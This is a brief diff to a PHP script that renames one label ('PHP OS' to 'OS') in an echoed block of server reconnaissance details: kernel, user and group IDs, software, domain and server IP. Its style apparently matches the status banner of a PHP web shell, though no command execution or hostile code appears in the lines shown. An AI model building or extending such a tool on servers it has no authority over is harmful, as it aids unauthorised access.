@@ -69,7 +69,7 @@
         echo "<div>
                     System: <gr>$kernel</gr><br>
                     User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br>
-                    PHP Version: <gr>$phpver</gr> | PHP OS: <gr>$phpos</gr><br>
+                    PHP Version: <gr>$phpver</gr> | OS: <gr>$phpos</gr><br>
                     Software: <gr>$soft</gr><br>
                     Domain: <gr>$domen</gr><br>
                     Server IP: <gr>$ip</gr><br>
